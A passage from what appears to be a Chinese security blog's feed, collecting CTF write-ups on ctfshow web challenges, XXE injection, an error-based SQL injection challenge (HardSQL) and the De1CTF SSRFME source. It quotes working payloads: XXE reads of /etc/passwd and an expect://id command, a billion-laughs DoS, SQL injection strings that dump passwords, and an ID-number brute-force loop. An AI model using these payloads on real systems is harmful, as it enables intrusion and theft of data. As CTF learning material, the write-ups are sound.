src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200917205952.png" alt></p><p>r=1的时候rand=-1833303828</p><p>mt_rand()=r-rand=1833303829</p><p>然后kali运行脚本./php_mt_seed 1833303829</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213544.png" alt="web25.2"></p><p>我用的是第一个php7.1.0+版本的种子然后</p><pre><code>&lt;?phpmt_srand(399933415);echo mt_rand().&quot;\n&quot;;echo mt_rand()+mt_rand();</code></pre><p>返回1833303829 1800730406</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213708.png" alt="web25.3"></p><p>设置r= 和token=</p><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930201911.png" alt="web26.1"></p><p>爆破pass</p><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903224458.png" alt="web27.1"></p><p>题目是个正方的教务管理系统，有录取名单和学生学籍信息查询系统两个功能</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903224628.png" alt="web27.2"></p><p>录取名单下载下来是一份表格，学生学籍信息查询系统要求输入姓名和身份证号码</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903225120.png" alt="web27.3">这里就用表格里第一个人的信息</p><p>高先伊 身份证号码621022<strong>****</strong>5237</p><p>中年的出生年月日居然不给要自己爆破，这里可以通过检验身份证号码是否合理，筛选符合条件的身份证，可惜我的代码写的太烂，写出来的我自己都不敢看，这里就不贴了，放一个不用检验身份证号码合理性的代码吧（希望服务器没事……）</p><pre><code>for year in range(1990,1993):    for month in range(1,13):        for day in range(1,32):            card = &quot;621022&quot; + str(year) + str(&quot;%02d&quot;%(month)) + str(&quot;%02d&quot;%(day)) + &quot;5237&quot;            print(card)</code></pre><p>然后拿着姓名+身份证去学籍信息查询系统爆破，得到正确的身份证号码，然后会弹窗提示学号和默认密码（身份证号）</p><p>登录得到flag</p><p>（还有师傅说去在线生成身份证的网站上输入姓名能直接找到，这比我还狠啊…）</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213906.png" alt="web28.1"></p><p>访问之后url是这样的/0/1/2.txt，然后手动尝试访问/0/1.txt之后url被重定向到/0/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/2.txt</p><p>刚开始我想的是爆破0和1的各种组合目录，最后啥也爆破不出来，看师傅们的wp才知道是爆破/0-100/0-100/</p><p>爆破/0-100/0-100/就行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;web21&quot;&gt;&lt;a href=&quot;#web21&quot; class=&quot;headerlink&quot; title=&quot;web21&quot;&gt;&lt;/a&gt;web21&lt;/h3&gt;&lt;p&gt;&lt;img data-action=&quot;zoom&quot; src=&quot;https://cdn.jsdelivr.net/gh/l
      
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门信息搜集</title>
    <link href="https://lingxin16.github.io/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://lingxin16.github.io/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2020-09-03T03:22:59.000Z</published>
    <updated>2020-11-20T10:44:36.167Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903112401.png" alt="web1.1"></p><p>提示开发注释未及时删除，f12查看源代码</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903112530.png" alt="web1.2"></p><p>得到flag</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903113028.png" alt="web2.1"></p><p>提示js前台拦截 === 无效操作</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903113122.png" alt="web2.2"></p><p>打开后发现无法右键查看源代码，f12也不管用，在url前加上view-source: 查看源代码</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/asdf.png" alt="web2.3"></p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903113802.png" alt="web3.1"></p><p>提示没思路的时候抓个包看看，可能会有意外收获</p><p>发现题目页面确实没什么东西，查看文件头，发现flag</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903113903.png" alt="web3.2"></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903114014.png" alt="web4.1"></p><p>提示总有人把后台地址写入robots，帮黑阔大佬们引路。</p><p>查看/robots.txt</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903114101.png" alt="web4.2"></p><p>发现/flagishere.txt，访问得到flag</p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903171250.png" alt="web5.1"></p><p>提示phps源码泄露有时候能帮上忙，表示我刚开始并不知道phps源码泄露是什么，在大佬们的提示下才知道了phps这个东西。</p><pre><code>关于phps，phps其实就是php的源代码文件，通常用于提供给用户查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</code></pre><p>访问index.phps，下载下来查看源代码，即可得到flag</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903115756.png" alt="web5.2"></p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903115917.png" alt="web6.1"></p><p>提示解压源码到当前目录，测试正常，收工</p><p>说明存在源码的压缩包，并且没有删除，访问/<a href="http://www.zip，下载压缩包，解压得到fl000g.txt文件和index.php文件，fl000g.txt内容为flag{flag_here}，提交发现不对，访问/fl000g.txt，得到flag" target="_blank" rel="noopener">www.zip，下载压缩包，解压得到fl000g.txt文件和index.php文件，fl000g.txt内容为flag{flag_here}，提交发现不对，访问/fl000g.txt，得到flag</a></p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903120303.png" alt="web7.1"></p><p>提示版本控制很重要，但不要部署到生产环境更重要。</p><p>关于版本控制，首先想到的是git泄露，访问/.git，得到flag</p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903120441.png" alt="web8.1"></p><p>提示内容和web7一样，除了git泄露以外，还存在svn泄露，访问/.svn得到flag</p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903120654.png" alt="web9.1"></p><p>提示发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p><p>当我们在使用vim编辑的时候，vim会在被编辑文件同一目录下，创建一个名为filename.swp的文件，记录我们的动作，比如在编辑index.php的时候会存在一个index.php.swp的文件，访问/index.php.swp下载文件得到flag</p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903122036.png" alt="web10.1"></p><p>提示cookie 只是一块饼干，不能存放任何隐私数据</p><p>查看请求头</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903122144.png" alt="web10.2"></p><p>发现flag</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903125130.png" alt="web11.1"></p><p>提示域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</p><p>在域名解析记录中TXT记录查到了flag</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903125600.png" alt="web12.1"></p><p>提示有时候网站上的公开信息，就是管理员常用密码</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903125833.png" alt="web12.2"></p><p>访问/admin，需要账号和密码，账号填admin，密码根据提示在页面上找到了一串数字，应该就是密码了，尝试登陆得到flag</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903125957.png" alt="web12.3"></p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903141526.png" alt="web13.1"></p><p>摸索了好久，发现了git泄露，上githack一把嗦，结果啥都嗦不出来，githack还总是报错，在大佬们的提示下，找到了个pdf</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903201121.png" alt="web13.2"></p><p>下载下来发现是个系统使用手册里面有默认后台地址和默认用户名密码，利用这些登录后台得到flag</p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903135945.png" alt="web14.1"></p><p>提示有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p><p>访问/editor</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903140039.png" alt="web14.2"></p><p>点击插入文件（第二排倒数第十个）选择文件空间</p><p>在tmp/html/nothinghere文件夹中找到fl000g.txt，插入文件后会显示路径<a href="http://67a7ed1b-34c7-426b-8a90-3014478908e1.chall.ctf.show/editor/attached/file/tmp/html/nothinghere/fl000g.txt" target="_blank" rel="noopener">/editor/attached/file/tmp/html/nothinghere/fl000g.txt</a></p><p>访问nothinghere/fl000g.txt得到flag</p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903201705.png" alt="web15.1"></p><p>提示公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p><p>访问/admin发现后台</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903230136.png" alt="web15.2"></p><p>有个忘记密码选项，就是它，点进去！问：我的所在地是哪个城市？</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903230501.png" alt="web15.3"></p><p>根据题目提示，在首页找到一个QQ邮箱，查看QQ资料发现所在城市，提交</p><p>然后提示您的密码已重置为***，这不就OK了！！！登录 flag！</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904141648.png" alt="web16.1"></p><p>又学到一个新东西，/tz.php，找到phpinfo 点进去搜索flag</p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904142149.png" alt="web17.1"></p><p>真实ip就是flag，不多说什么了</p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904144704.png" alt="web18.1"></p><p>是一个游戏，题目说玩到101分就给flag，…，有一个Flappy_js.js文件，查看内容发现</p><pre><code>if(score&gt;100){var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;);}</code></pre><p>翻译过来就是如果分数大于100，提示你赢了，去幺幺零点皮爱吃皮看看，根据提示访问110.php得到flag</p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904150123.png" alt="web19.1"></p><p>源文件中有加密代码，注释提示了</p><pre><code>if($u===&#39;admin&#39; &amp;&amp; $p ===&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;){              echo $flag;          }</code></pre><p>那我们提交就行了，但是我们在网页上提交的pazzword是经过了前端加密后的，所以抓包修改重发就行了</p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904152136.png" alt="web20.1"></p><p>这个题是归到爆破了我记得，但是这种类型的年代久远了，用御剑和sqlmap都爆破不出来，是在db目录下的一个mdb文件，/db/db.mdb，下载这个数据库文件后打开就有flag了</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915200701.png" alt="web20.2"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h3&gt;&lt;p&gt;&lt;img data-action=&quot;zoom&quot; src=&quot;https://cdn.jsdelivr.net/gh/lingx
      
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xxe漏洞学习</title>
    <link href="https://lingxin16.github.io/2020/08/11/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://lingxin16.github.io/2020/08/11/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-08-11T02:36:33.000Z</published>
    <updated>2020-08-11T04:39:05.665Z</updated>
    
    <content type="html"><![CDATA[<p>前几天ctfshow的webak赛有一道利用xxe漏洞的题，当时看一些xxe的资料也没整出来，想着再学习下。</p><a id="more"></a><p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p><h4 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code></pre><h4 id="DTD文档类型定义"><a href="#DTD文档类型定义" class="headerlink" title="DTD文档类型定义"></a>DTD文档类型定义</h4><p>1.内部DTD文档</p><pre><code>&lt;!DOCTYPE 根元素[定义内容]&gt;</code></pre><p>2.外部DTD文档</p><pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code></pre><p>3.内外部DTD文档结合</p><pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></pre><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><pre><code>&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [&lt;!ELEMENT data (#ANY)&gt;]&gt;&lt;data&gt;4&lt;/data&gt;</code></pre><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt;   &lt;core id=&quot;test101&quot;&gt;      &lt;description&gt;&amp;xxe;&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;</code></pre><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天ctfshow的webak赛有一道利用xxe漏洞的题，当时看一些xxe的资料也没整出来，想着再学习下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="技术学习" scheme="https://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="XXE" scheme="https://lingxin16.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>白嫖腾讯云服务器和域名</title>
    <link href="https://lingxin16.github.io/2020/08/08/%E7%99%BD%E5%AB%96%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%9F%9F%E5%90%8D/"/>
    <id>https://lingxin16.github.io/2020/08/08/%E7%99%BD%E5%AB%96%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%9F%9F%E5%90%8D/</id>
    <published>2020-08-08T08:07:05.000Z</published>
    <updated>2020-08-08T08:12:13.931Z</updated>
    
    <content type="html"><![CDATA[<p>又能愉快的白嫖腾讯云服务器和cn域名了</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200808160923.png" alt></p><p>有博客的话填写博客地址和一个带有声明的文章地址就可以了，美滋滋</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200808161028.png" alt></p><p><strong>我的博客即将同步至腾讯云+社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=2m89uxlgnw8wg" target="_blank" rel="noopener">https://cloud.tencent.com/developer/support-plan?invite_code=2m89uxlgnw8wg</a></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;又能愉快的白嫖腾讯云服务器和cn域名了&lt;/p&gt;
&lt;p&gt;&lt;img data-action=&quot;zoom&quot; src=&quot;https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200808160923.png&quot; alt&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
      <category term="水博客" scheme="https://lingxin16.github.io/tags/%E6%B0%B4%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-HardSQL</title>
    <link href="https://lingxin16.github.io/2020/08/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/"/>
    <id>https://lingxin16.github.io/2020/08/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/</id>
    <published>2020-08-05T02:51:01.000Z</published>
    <updated>2020-08-05T05:23:53.809Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/1.png" alt></p><p>试了一下万能密码和双写绕过都不行</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805122957.png" alt></p><p>大佬们的博客讲的是报错注入，关于报错注入参考：</p><p><a href="https://www.cnblogs.com/c1047509362/p/12806297.html" target="_blank" rel="noopener">SQL注入实战之报错注入篇（updatexml extractvalue floor）</a></p><p>and和or都被过滤了</p><p>可以用^代替and，like代替=，()代替空格</p><p>这里用extractvalue操作</p><p>1’^extractvalue(1,concat(0x7e,(select(database()))))#</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805125626.png" alt></p><p>得到数据库名geek</p><p>1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(‘geek’)))))#</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805130349.png" alt></p><p>表名H4rDsq1</p><p>1’^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(‘H4rDsq1’)))))#</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805130557.png" alt></p><p>得到三个字段id,username,password</p><p>1’^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805131316.png" alt></p><p>只能得到左边部分flag{fc22e403-1ef2-4b32-90d8-c2，这是因为extractvalue和updatexml函数都只能最多显示32位</p><p>1’^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200805131737.png" alt></p><p>3-1ef2-4b32-90d8-c28bc57f9b2c}</p><p>拼起来得到flag{fc22e403-1ef2-4b32-90d8-c28bc57f9b2c}</p><p>还有利用updatexml</p><pre><code>updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)updatexml(1,concat(0x7e，(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1)updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1)updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1)updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF2019-SSRFME</title>
    <link href="https://lingxin16.github.io/2020/07/21/De1CTF2019-SSRFME/"/>
    <id>https://lingxin16.github.io/2020/07/21/De1CTF2019-SSRFME/</id>
    <published>2020-07-21T02:37:42.000Z</published>
    <updated>2020-07-21T06:59:36.995Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>题目打开就是源代码</p><p><img data-action="zoom" src="/2020/07/21/De1CTF2019-SSRFME/1.png" alt="1"></p><p>整理后的代码是</p><pre><code>#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app = Flask(__name__)secert_key = os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):#python得构造方法        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):         #查看是否存在这个文件目录，如果不存在创建一个            os.mkdir(self.sandbox)    def Exec(self):#定义的命令执行函数，此处调用了scan这个自定义的函数（scan是用来扫目录的）        result = {}        result[&#39;code&#39;] = 500   #给result赋一个初值，后续会通过判断改变它的值        if (self.checkSign()): #对传参格式进行校验（action必须是readscan，否则字符串拼接后进行加密，与sign进行比对失败则无法正常运行）            if &quot;scan&quot; in self.action:   #action要写scan                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)  # 对result执行写的命令                resp = scan(self.param)       # 此处是文件读取得注入点                if (resp == &quot;Connection Timeout&quot;):   # 如果没扫到目录的话（这条一般不会执行，所以看下面else就可以了）                    result[&#39;data&#39;] = resp                else:                    print resp #输出结果                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] = 200  #注意缩进，这里不管扫没扫到目录，code的值都已经改变为200            if &quot;read&quot; in self.action:#action要加read                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)  对result进行读的权限                result[&#39;code&#39;] = 200                result[&#39;data&#39;] = f.read()            if result[&#39;code&#39;] == 500:  #这里进行判断，如果code值为500说明传参错误                result[&#39;data&#39;] = &quot;Action Error&quot;        else:            result[&#39;code&#39;] = 500            result[&#39;msg&#39;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign): #!!!校验            return True        else:            return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;]) # !!!这个路由用于测试，/genesign这个目录是可以进去的def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])#这个路由是我萌得最终注入点def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#39;/&#39;)#根目录路由，就是显示源代码得地方def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):#这是用来扫目录的函数    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):#!!!这个应该是本题关键点,此处注意顺序先是param后是action    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):#这个waf比较没用好像    check=param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ == &#39;__main__&#39;:    app.debug = False    app.run(host=&#39;0.0.0.0&#39;)</code></pre><p>关键代码</p><pre><code>    def Exec(self):#定义的命令执行函数，此处调用了scan这个自定义的函数（scan是用来扫目录的）        result = {}        result[&#39;code&#39;] = 500   #给result赋一个初值，后续会通过判断改变它的值        if (self.checkSign()): #对传参格式进行校验（action必须是readscan，否则字符串拼接后进行加密，与sign进行比对失败则无法正常运行）            if &quot;scan&quot; in self.action:   #action要写scan                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)  # 对result执行写的命令                resp = scan(self.param)       # 此处是文件读取得注入点                if (resp == &quot;Connection Timeout&quot;):   # 如果没扫到目录的话（这条一般不会执行，所以看下面else就可以了）                    result[&#39;data&#39;] = resp                else:                    print resp #输出结果                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] = 200  #注意缩进，这里不管扫没扫到目录，code的值都已经改变为200            if &quot;read&quot; in self.action:#action要加read                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)  对result进行读的权限                result[&#39;code&#39;] = 200                result[&#39;data&#39;] = f.read()            if result[&#39;code&#39;] == 500:  #这里进行判断，如果code值为500说明传参错误                result[&#39;data&#39;] = &quot;Action Error&quot;        else:            result[&#39;code&#39;] = 500            result[&#39;msg&#39;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign): #!!!校验            return True        else:            return False</code></pre><p>我们需要满足的条件就是<code>getSign(self.action, self.param) == self.sign</code></p><p>即secert_key + param + 